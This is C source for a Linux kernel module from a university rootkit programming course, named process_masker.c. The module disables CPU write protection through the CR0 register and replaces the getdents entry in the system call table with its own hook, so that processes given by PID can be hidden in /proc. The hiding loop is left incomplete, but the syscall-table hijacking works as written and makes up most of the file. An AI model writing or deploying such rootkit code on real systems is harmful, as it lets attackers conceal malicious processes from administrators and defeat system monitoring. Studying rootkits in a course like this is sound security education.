
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>   /* Needed by all kernel modules */
#include <linux/syscalls.h>   /* Needed for __NR_getdents */
#include <linux/namei.h>   /* Needed for kern_path & LOOKUP_FOLLOW */

#include "process_masker.h"
#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */

MODULE_LICENSE("GPL");

static int pids[PIDS_BUFFSIZE];
static int pids_count = 0;
module_param_array(pids, int, &pids_count, 0);   // TODO: edit the permission bits (last argument)


unsigned long proc_ino;
void **sys_call_table;
asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
static int __init process_masker_start(void)
{
	int i;

	proc_ino = get_inode_no("/proc");
    printk(KERN_INFO "process_masker rootkit: inode_no of dir `/proc` is %lu\n", proc_ino);

	disable_write_protect_mode();

	/* Store original getdents() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	getdents_syscall = (void *) sys_call_table[__NR_getdents];

	/* Replace in the system call table the original
	   getdents() syscall with our process masker function */
	sys_call_table[__NR_getdents] = (unsigned long *) my_getdents_syscall;

	enable_write_protect_mode();

	printk(KERN_INFO "process_masker rootkit: %s\n", "successfully inserted");

	printk(KERN_INFO "process_masker rootkit: pids_count = %d\n", pids_count);
	for (i=0 ; i<PIDS_BUFFSIZE ; i++)
		printk(KERN_INFO "process_masker rootkit: pids[%d]= %d\n", i, pids[i]);

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
static void __exit process_masker_end(void)
{
	disable_write_protect_mode();
	/* Restore original getdents() syscall */
	sys_call_table[__NR_getdents] = (int *) getdents_syscall;
	enable_write_protect_mode();

	printk(KERN_INFO "process_masker rootkit: %s\n", "successfully removed");

	return;
}


/* Function that replaces the original getdents_syscall. In addition to what
   getdents_syscall does, it also  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_copy;

	/* Call original getdents_syscall */
	nread = getdents_syscall(fd, dirp, count);

	if (dirp->d_ino != proc_ino)
		return nread;

	printk(KERN_INFO "process_masker rootkit: reading dir `/proc`");

	nread_copy = nread;

	while (nread_copy > 0) {
		nread_copy -= dirp->d_reclen;

		//printk(KERN_INFO "Filename: %s\n", dirp->d_name);
		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}


/* Function that gets the inode number of the file found under `path` */
unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~0x00010000);
}


// TODO: what if write protection was disabled in the first place?
void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | 0x00010000);
}


module_init(process_masker_start);
module_exit(process_masker_end);
